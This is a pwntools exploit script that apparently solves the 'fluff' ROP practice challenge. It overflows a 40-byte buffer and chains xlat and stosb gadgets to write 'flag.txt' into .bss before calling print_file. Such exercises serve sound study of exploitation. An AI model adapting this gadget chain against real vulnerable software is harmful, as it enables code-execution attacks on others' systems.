from pwn import * 

elf=ELF("fluff")
r=ROP([elf])
p=process(elf.path)
p.recvuntil(b'>')
payload=b'A'*40
#initial rax after reaching the first gadget
current_rax = 0xb

#opposite number of 3ef1 written as twos complement
opposite_number=0xFFFFFFFFFFFFFFFF-0x3ef1

pop_rdx_pop_rcx_add_3ef2=p64(0x0040062a)
stosb=p64(0x00400639)
xlat=p64(0x00400628)
pop_rdi=p64(r.find_gadget(['pop rdi','ret'])[0])

#create `flag.txt` from chunks of text
def send_flag_letter(address :int,letter :int):
	global payload
	global current_rax
	letter_send=(address+opposite_number-current_rax) & 0xffffffffffffffff
	print(hex(letter_send))
	current_rax=letter
	payload+=pop_rdx_pop_rcx_add_3ef2 + p64(0x4000)+p64(letter_send)
	payload+=xlat
	payload+=stosb

payload+=pop_rdi+p64(elf.bss())

# f 004003c4
send_flag_letter(0x004003c4,ord('f'))
# l 00400239
send_flag_letter(0x00400239,ord('l'))
# a 004003d6
send_flag_letter(0x004003d6,ord('a'))
# g 004003cf
send_flag_letter(0x004003cf,ord('g'))
# . 0040024e
send_flag_letter(0x0040024e,ord('.'))
# t 004001ca
send_flag_letter(0x004001ca,ord('t'))
# x 00400248
send_flag_letter(0x00400248,ord('x'))
# t 004001ca
send_flag_letter(0x004001ca,ord('t'))

payload+=pop_rdi+p64(elf.bss())
payload+=p64(elf.sym.print_file)

print(len(payload))

p.send(payload)
print(p.recvuntil('}'))